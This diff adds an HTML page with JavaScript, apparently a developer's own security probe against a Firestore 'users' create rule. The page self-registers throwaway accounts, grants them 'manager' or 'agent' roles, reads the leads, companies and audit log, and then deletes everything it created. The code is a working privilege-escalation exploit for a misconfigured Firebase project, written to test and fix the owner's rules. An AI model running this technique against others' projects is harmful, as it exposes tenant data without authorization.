@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>users CREATE Rule — Adversarial Probe (Session P0)</title>
+<style>
+  body{font-family:ui-monospace,Consolas,monospace;background:#111;color:#eee;padding:24px;max-width:900px;margin:0 auto}
+  h2{color:#f87171}
+  button{padding:10px 18px;margin:4px 4px 4px 0;background:#7c3aed;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px}
+  button:disabled{opacity:.4;cursor:default}
+  .ok{color:#4ade80}
+  .err{color:#f87171}
+  .crit{color:#fbbf24;font-weight:700}
+  .dim{color:#888}
+  .warn{background:#3f1d1d;border:1px solid #7f1d1d;padding:12px;border-radius:6px;margin:12px 0}
+  pre{background:#1a1a1a;padding:14px;border-radius:6px;white-space:pre-wrap;word-break:break-word;line-height:1.6}
+</style>
+</head>
+<body>
+<!--
+  users CREATE rule — adversarial probe. Session P0, Step 2.
+
+  WHAT THIS TESTS
+  ---------------
+  The users collection's create rule currently reads:
+
+      allow create: if isAuth() && (
+        request.auth.uid == uid ||                     // <-- the hole
+        (role() == 'manager' && sameOrgWrite())
+      );
+
+  `request.auth.uid == uid` carries NO field validation. Anyone who can
+  self-register through the public Firebase Auth API — which needs only
+  the apiKey shipped in config.js, a value that is public by design and
+  readable straight off the deployed site — can therefore write their own
+  users/{uid} document with any role and any orgId they like. Every other
+  rule in the file resolves trust through that document (role(),
+  isActiveBackend(), sameOrg(), sameOrgWrite() all go through userDoc()),
+  so one self-write is full authority over a tenant.
+
+  The SEED_EMAILS allowlist in js/auth.js does not mitigate this: it is
+  client-side, and an attacker never runs the app. This probe deliberately
+  does NOT load js/state.js or js/auth.js — it talks to the same Firebase
+  project directly, exactly as an attacker would, which is the entire
+  point. It never asks for anyone's credentials, because it does not need
+  any: it registers its own throwaway identities.
+
+  WHAT IT DOES
+  ------------
+  Two throwaway accounts on two isolated Firebase app instances:
+
+    A  self-registers, then writes users/{A} with role:'manager'
+       -> reads leads, companies, and auditLog (auditLog read is
+          manager-only, so it is the proof that role() really did
+          resolve to 'manager')
+    B  self-registers, then writes users/{B} with role:'agent'
+       -> reads leads and companies (they succeed: those read rules are
+          `isAuth() && sameOrg()` with NO role check at all)
+       -> reads auditLog (must be DENIED, confirming B is genuinely a
+          plain agent and not silently privileged)
+
+  B is the sharper half of the finding: constraining only `role` on this
+  rule would not close it. A self-created plain 'agent' with the right
+  orgId already reads the tenant's entire lead book and company book.
+
+  CLEANUP is automatic and total. A deletes users/{B} then users/{A}
+  (delete is manager-only, and A is a manager for exactly as long as this
+  takes), then both Auth accounts delete themselves via deleteUser(). The
+  run ends with a verification pass that re-reads both docs and reports
+  whether anything was left behind. If cleanup ever reports a leftover,
+  remove it by hand in the Firebase Console before doing anything else.
+
+  EXPECTED RESULTS
+  ----------------
+    BEFORE the Step 2 rule fix (rules as published today):
+      A create -> OK   (CRITICAL — the hole is real)
+      A reads  -> OK on leads/companies/auditLog
+      B create -> OK   (CRITICAL — role is unvalidated)
+      B reads  -> OK on leads/companies, DENIED on auditLog
+
+    AFTER the Step 2 rule fix (create narrowed to manager-only):
+      A create -> DENIED (permission-denied)
+      B create -> DENIED (permission-denied)
+      all reads -> DENIED, because sameOrg()'s userDoc() get() on a
+                   nonexistent users doc errors out and an evaluation
+                   error denies the whole rule (the established
+                   get-on-nonexistent-doc behaviour, ARCHITECTURE.md §12)
+
+  RESULT LOG (fill in on each run)
+  --------------------------------
+    (pending — see ARCHITECTURE.md §18 for the recorded before/after run)
+-->
+<h2>users CREATE Rule — Adversarial Probe</h2>
+<p class="dim">Session P0, Step 2. Standalone: does not load js/state.js or js/auth.js, and never asks for anyone's credentials — it registers its own throwaway identities through the public Firebase Auth API, exactly as an attacker would. See the file header for the full method, expected before/after results, and the cleanup guarantee.</p>
+
+<div class="warn">
+  <b>This writes to live Firestore.</b> It briefly creates two throwaway Auth accounts and (if the hole is still open) two <code>users</code> documents, one of them <code>role:'manager'</code>. Everything is deleted before the run finishes, and the last section of the output verifies that. Run it from localhost only.
+</div>
+
+<button id="run">Run Probe</button>
+<pre id="out"></pre>
+
+<script type="module">
+  import { initializeApp, deleteApp } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js';
+  import { getAuth, createUserWithEmailAndPassword, deleteUser } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js';
+  import { getFirestore, doc, getDoc, setDoc, deleteDoc, collection, query, limit, getDocs } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js';
+  import { firebaseConfig, orgId } from '../config.js';
+
+  const out    = document.getElementById('out');
+  const runBtn = document.getElementById('run');
+
+  function log(line, cls){
+    const div = document.createElement('div');
+    if(cls) div.className = cls;
+    div.textContent = line;
+    out.appendChild(div);
+  }
+
+  // Returns {ok:boolean, detail:string} rather than throwing — every step
+  // here has a meaningful failure mode that the run must keep going past,
+  // especially after the fix, where most steps are SUPPOSED to be denied.
+  async function attempt(label, fn, expectation){
+    try {
+      const detail = await fn();
+      log(`  OK      ${label} — ${detail}`, 'ok');
+      return { ok:true, detail };
+    } catch(e){
+      log(`  DENIED  ${label} — ${e.code || '(no code)'}: ${e.message}`, 'err');
+      return { ok:false, detail:e.code || e.message };
+    }
+  }
+
+  function throwaway(tag){
+    const rnd = Math.random().toString(36).slice(2,10);
+    return {
+      email: `p0-probe-${tag}-${rnd}@example.invalid`,
+      pw:    'Pr0be-' + Math.random().toString(36).slice(2,14) + '!'
+    };
+  }
+
+  runBtn.onclick = async () => {
+    out.textContent = '';
+    runBtn.disabled = true;
+
+    // Two isolated app instances so both throwaway identities can be held
+    // signed in at once — A needs to still be authenticated as a manager
+    // while it deletes B's document.
+    const appA = initializeApp(firebaseConfig, 'P0ProbeA');
+    const appB = initializeApp(firebaseConfig, 'P0ProbeB');
+    const authA = getAuth(appA), dbA = getFirestore(appA);
+    const authB = getAuth(appB), dbB = getFirestore(appB);
+
+    let userA = null, userB = null;
+    let createdA = false, createdB = false;
+
+    try {
+      log(`project: ${firebaseConfig.projectId}    orgId: ${orgId}`, 'dim');
+      log(`run at:  ${new Date().toISOString()}`, 'dim');
+      log('');
+
+      // ── ACCOUNT A — self-register, then self-write role:'manager' ──
+      log('[A] Attacker self-registers and claims role:\'manager\'');
+      const credsA = throwaway('a');
+      const regA = await attempt(`self-register ${credsA.email}`, async () => {
+        const c = await createUserWithEmailAndPassword(authA, credsA.email, credsA.pw);
+        userA = c.user;
+        return `uid ${c.user.uid}`;
+      });
+      if(!regA.ok){
+        log('', 'dim');
+        log('Self-registration itself failed. If Email/Password sign-up is disabled', 'dim');
+        log('on this project, that is a separate (and welcome) mitigation — but the', 'dim');
+        log('rule is still wrong, and re-enabling sign-up would reopen it.', 'dim');
+        throw new Error('cannot continue without a throwaway identity');
+      }
+
+      const createA = await attempt("write users/{A} with role:'manager'", async () => {
+        await setDoc(doc(dbA,'users',userA.uid), {
+          name: 'P0 Probe A', email: credsA.email, role: 'manager',
+          orgId, teamId: null, active: true,
+          createdBy: 'p0-probe', createdAt: new Date().toISOString()
+        });
+        return 'document written';
+      });
+      createdA = createA.ok;
+
+      if(createA.ok){
+        log('  >> CRITICAL: an unauthenticated stranger just became a manager.', 'crit');
+        await attempt('read leads as A',      async () => `${(await getDocs(query(collection(dbA,'leads'),      limit(5)))).size} docs (capped at 5)`);
+        await attempt('read companies as A',  async () => `${(await getDocs(query(collection(dbA,'companies'),  limit(5)))).size} docs (capped at 5)`);
+        await attempt('read auditLog as A',   async () => `${(await getDocs(query(collection(dbA,'auditLog'),   limit(5)))).size} docs (capped at 5) — manager-only read, so this proves role() resolved to 'manager'`);
+      }
+      log('');
+
+      // ── ACCOUNT B — self-register, then self-write role:'agent' ──
+      log("[B] Same hole, no privilege escalation — a plain 'agent' still reads everything");
+      const credsB = throwaway('b');
+      const regB = await attempt(`self-register ${credsB.email}`, async () => {
+        const c = await createUserWithEmailAndPassword(authB, credsB.email, credsB.pw);
+        userB = c.user;
+        return `uid ${c.user.uid}`;
+      });
+
+      if(regB.ok){
+        const createB = await attempt("write users/{B} with role:'agent'", async () => {
+          await setDoc(doc(dbB,'users',userB.uid), {
+            name: 'P0 Probe B', email: credsB.email, role: 'agent',
+            orgId, teamId: null, tlId: null, active: true,
+            createdBy: 'p0-probe', createdAt: new Date().toISOString()
+          });
+          return 'document written';
+        });
+        createdB = createB.ok;
+
+        if(createB.ok){
+          log('  >> The lead book and company book below are readable by a self-created', 'crit');
+          log('  >> plain agent. Constraining only `role` on this rule would NOT close it.', 'crit');
+          await attempt('read leads as B',     async () => `${(await getDocs(query(collection(dbB,'leads'),     limit(5)))).size} docs (capped at 5)`);
+          await attempt('read companies as B', async () => `${(await getDocs(query(collection(dbB,'companies'), limit(5)))).size} docs (capped at 5)`);
+          await attempt('read auditLog as B',  async () => `${(await getDocs(query(collection(dbB,'auditLog'),  limit(5)))).size} docs — EXPECTED DENIED; success here would mean B is not really a plain agent`);
+        }
+      }
+      log('');
+
+    } catch(e){
+      log(`run aborted: ${e.message}`, 'err');
+      log('');
+    }
+
+    // ── CLEANUP — always runs, whatever happened above ──
+    log('[cleanup]');
+    // A is a manager for as long as its own document says so, so A is the
+    // only identity in this run that can delete either document. Order
+    // matters: B's document first, then A's own.
+    if(createdB && userB) await attempt('A deletes users/{B}', async () => { await deleteDoc(doc(dbA,'users',userB.uid)); return 'deleted'; });
+    if(createdA && userA) await attempt('A deletes users/{A}', async () => { await deleteDoc(doc(dbA,'users',userA.uid)); return 'deleted'; });
+    if(userB) await attempt('delete Auth account B', async () => { await deleteUser(userB); return 'deleted'; });
+    if(userA) await attempt('delete Auth account A', async () => { await deleteUser(userA); return 'deleted'; });
+    log('');
+
+    // ── VERIFY CLEANUP — re-read with a third, unrelated throwaway that
+    // grants itself manager, purely so it can SEE whether anything is left.
+    // Skipped entirely once the hole is closed, since by then nothing could
+    // have been created in the first place.
+    log('[verify cleanup]');
+    if(createdA || createdB){
+      const appV = initializeApp(firebaseConfig, 'P0ProbeV');
+      const authV = getAuth(appV), dbV = getFirestore(appV);
+      let userV = null;
+      try {
+        const credsV = throwaway('v');
+        const c = await createUserWithEmailAndPassword(authV, credsV.email, credsV.pw);
+        userV = c.user;
+        await setDoc(doc(dbV,'users',userV.uid), {
+          name:'P0 Probe V', email:credsV.email, role:'manager', orgId,
+          teamId:null, active:true, createdBy:'p0-probe', createdAt:new Date().toISOString()
+        });
+        for(const [tag,u] of [['A',userA],['B',userB]]){
+          if(!u) continue;
+          const snap = await getDoc(doc(dbV,'users',u.uid));
+          if(snap.exists()) log(`  LEFTOVER users/${u.uid} (probe ${tag}) still exists — delete it in the Firebase Console.`, 'err');
+          else              log(`  clean — users/${u.uid} (probe ${tag}) is gone`, 'ok');
+        }
+        await deleteDoc(doc(dbV,'users',userV.uid));
+        await deleteUser(userV);
+        log('  clean — verifier removed itself', 'ok');
+      } catch(e){
+        log(`  verifier could not run (${e.code || e.message}). Check users/ manually in the Console.`, 'err');
+        if(userV){ try { await deleteUser(userV); } catch(_){} }
+      }
+      try { await deleteApp(appV); } catch(_){}
+    } else {
+      log('  nothing was created, so nothing to verify — the create rule held.', 'ok');
+    }
+
+    try { await deleteApp(appA); } catch(_){}
+    try { await deleteApp(appB); } catch(_){}
+
+    log('');
+    log('Done. Copy this whole output into the session.', 'dim');
+    runBtn.disabled = false;
+  };
+</script>
+</body>
+</html>
